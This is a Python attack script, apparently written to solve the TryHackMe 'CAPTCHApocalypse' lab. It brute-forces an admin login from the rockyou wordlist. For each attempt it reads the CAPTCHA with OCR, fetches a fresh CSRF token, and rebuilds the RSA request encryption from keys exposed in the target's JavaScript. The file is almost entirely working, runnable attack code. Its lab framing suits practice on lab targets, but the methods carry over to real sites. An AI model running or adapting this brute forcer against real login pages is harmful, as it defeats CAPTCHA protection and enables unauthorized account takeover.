#!/usr/bin/env python3
"""
CAPTCHApocalypse (TryHackMe): credential brute force and OCR solver.

Kali Linux. AUTHORIZED USE ONLY on your own THM lab instance.

The login request is encrypted with RSA, the csrf_token is single use, and the
captcha is regenerated on every submission. Because script.js on the target
exposes both RSA keys, the exchange is reproduced in Python. Each attempt fetches
and reads a fresh captcha via OCR, retrieves a fresh csrf_token with a GET request
to the site root, submits the encrypted payload containing the username, password,
captcha and token, and then decrypts the reply. A misread captcha is rejected
without the password being checked, so the attempt is repeated with a fresh
captcha, bounded by MAX_CAPTCHA_TRIES. The RSA keys are supplied as PEM files on
the command line.

Requirements (Kali):
    sudo apt install tesseract-ocr python3-pil python3-pytesseract python3-pycryptodome python3-requests
"""

import re
import sys
import base64
import io
from collections import Counter
from urllib.parse import urlencode

import requests
from PIL import Image, ImageFilter
import pytesseract
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Random import get_random_bytes

# ============================ CONFIG ============================
TARGET   = "http://127.0.0.1"                   # Placeholder. The target is provided on the command line.
USERNAME = "admin"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
LIMIT    = 100
CAPTCHA_LEN = 5                                  # The captcha length for this room is five characters, A to Z and 0 to 9.
WHITELIST = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
MAX_CAPTCHA_TRIES = 20                            # Safety cap on captcha retries per password. It prevents a
                                                 # persistently unreadable captcha from looping indefinitely.

# ================================================================

# The RSA keys are supplied as PEM files on the command line and are loaded in
# main() via load_keys(). The file script.js on the target exposes both keys: the
# server public key, which encrypts the login requests, and the client private
# key, which decrypts the replies.
_encryptor = None       # Built from the server public key. Encrypts requests.
_decryptor = None       # Built from the client private key. Decrypts replies.


def load_keys(public_key_path, private_key_path):
    """Import the RSA keys from the PEM files provided on the command line and
    build the request encryptor from the server public key and the reply decryptor
    from the client private key. The program exits with a clear message if a file
    is missing or is not a valid PEM."""
    global _encryptor, _decryptor
    try:
        with open(public_key_path, "rb") as f:
            pub = RSA.import_key(f.read())
        with open(private_key_path, "rb") as f:
            priv = RSA.import_key(f.read())
    except FileNotFoundError as e:
        sys.exit(f"[FAIL] Key file not found: {e.filename}")
    except (ValueError, IndexError, TypeError) as e:
        sys.exit(f"[FAIL] A key file could not be parsed as a valid PEM ({e}).")
    _encryptor = PKCS1_v1_5.new(pub)
    _decryptor = PKCS1_v1_5.new(priv)


def encrypt(plaintext: str) -> str:
    return base64.b64encode(_encryptor.encrypt(plaintext.encode())).decode()


def decrypt(b64_ciphertext: str) -> str:
    sentinel = get_random_bytes(16)
    out = _decryptor.decrypt(base64.b64decode(b64_ciphertext), sentinel)
    return "<decryption failed>" if out == sentinel else out.decode(errors="replace")


def start_session():
    s = requests.Session()
    s.get(f"{TARGET}/", timeout=15)
    return s


def get_csrf(s) -> str:
    r = s.get(f"{TARGET}/", timeout=15)
    m = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text) \
        or re.search(r'id="csrf_token"[^>]*value="([^"]+)"', r.text)
    if not m:
        sys.exit("[FAIL] csrf_token not found. Verify that the target is correct and the lab is running.")
    return m.group(1)


def _ocr_variant(gray, thr, psm) -> str:
    im = gray.point(lambda p: 0 if p < thr else 255).filter(ImageFilter.MedianFilter(3))
    raw = pytesseract.image_to_string(
        im, config=f"--psm {psm} -c tessedit_char_whitelist={WHITELIST}")
    return "".join(c for c in raw.upper() if c in WHITELIST)


def ocr_captcha(s) -> str:
    """Fetch the current captcha in this session and read it via OCR. The function
    returns the five character guess, or an empty string if no threshold and page
    segmentation mode combination produced a clean read of the expected length."""
    r = s.get(f"{TARGET}/captcha.php", timeout=15)
    gray = Image.open(io.BytesIO(r.content)).convert("L")
    gray = gray.resize((gray.width * 4, gray.height * 4), Image.LANCZOS)
    votes = Counter()
    for thr in (110, 130, 150, 170):
        for psm in (7, 8):
            g = _ocr_variant(gray, thr, psm)
            if len(g) == CAPTCHA_LEN:
                votes[g] += 1
    return votes.most_common(1)[0][0] if votes else ""


def attempt(s, csrf, password, captcha) -> str:
    params = urlencode({
        "action": "login",
        "csrf_token": csrf,
        "username": USERNAME,
        "password": password,
        "captcha_input": captcha,
    })
    r = s.post(f"{TARGET}/server.php", json={"data": encrypt(params)}, timeout=15)
    try:
        data = r.json().get("data")
    except ValueError:
        return f"<non JSON reply, HTTP {r.status_code}>"
    return decrypt(data) if data else "<reply had no 'data' field>"


def try_password(s, password):
    """Evaluate a single password. The function fetches a fresh captcha, which is
    consumed on every submission, reads it via OCR, and submits the login request.
    A misread captcha is rejected with the message "CAPTCHA incorrect" and the
    password is not checked, so the attempt is repeated with a fresh captcha until
    one is accepted. A single accepted captcha fully evaluates the password, at
    which point the loop stops. The number of retries is bounded by
    MAX_CAPTCHA_TRIES. The function returns the login reply. A successful login
    ends the run immediately."""
    reply = "<no attempt made>"
    accepted = None
    tries = 0
    while accepted is None and tries < MAX_CAPTCHA_TRIES:
        captcha = ocr_captcha(s)
        csrf = get_csrf(s)                     # A fresh, single use token.
        reply = attempt(s, csrf, password, captcha or "?????")
        tries += 1
        low = reply.lower()
        if "success" in low:
            return reply                       # The password was found. Stop immediately.
        if "captcha" not in low:
            accepted = reply                   # The captcha was accepted, so this is the real login verdict.
    # The accepted verdict is returned. If the safety cap is reached without any
    # captcha being accepted, the last reply is returned instead.
    return accepted or reply


def load_passwords():
    try:
        with open(WORDLIST, encoding="latin-1") as f:
            return [next(f).rstrip("\r\n") for _ in range(LIMIT)]
    except FileNotFoundError:
        sys.exit(f"[FAIL] Wordlist not found: {WORDLIST}.\n"
                 f"       If it is compressed, decompress it with: sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
    except StopIteration:
        with open(WORDLIST, encoding="latin-1") as f:
            return [l.rstrip("\r\n") for l in f]


def parse_args():
    import argparse
    p = argparse.ArgumentParser(
        description="CAPTCHApocalypse brute forcer. Authorized THM lab use only.")
    p.add_argument("target",
                   help="Target IP address or URL, for example 10.114.140.223 or http://10.114.140.223.")
    p.add_argument("public_key",
                   help="Path to the server public key PEM file, which encrypts login requests.")
    p.add_argument("private_key",
                   help="Path to the client private key PEM file, which decrypts server replies.")
    return p.parse_args()


def normalize_target(raw: str) -> str:
    raw = raw.strip().rstrip("/")
    if not raw.startswith(("http://", "https://")):
        raw = "http://" + raw
    return raw


def main():
    global TARGET
    args = parse_args()
    TARGET = normalize_target(args.target)
    load_keys(args.public_key, args.private_key)

    passwords = load_passwords()
    print(f"[*] Target   : {TARGET}")
    print(f"[*] Username : {USERNAME}")
    print(f"[*] Keys     : {args.public_key} (pub) / {args.private_key} (priv)")
    print(f"[*] Passwords: {len(passwords)} (first {LIMIT} of rockyou)")
    print(f"[*] Captcha  : OCR, fresh per attempt, consumed on each submission.\n")

    session = start_session()
    for i, pw in enumerate(passwords, 1):
        reply = try_password(session, pw)
        if "success" in reply.lower():
            print(f"\n[+] SUCCESS  ->  {USERNAME} : {pw}")
            print(f"[+] Server says: {reply}")
            return
        # The server's verdict for this password is printed. It is normally
        # "Login failed!". The implementation is documented in the functions above.
        print(f"[{i:3}/{len(passwords)}] {pw:<22} -> {reply}")

    print("\n[-] Wordlist exhausted. No valid password was found.")
    print("    Verify that the username is correct and that the supplied keys are current.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")

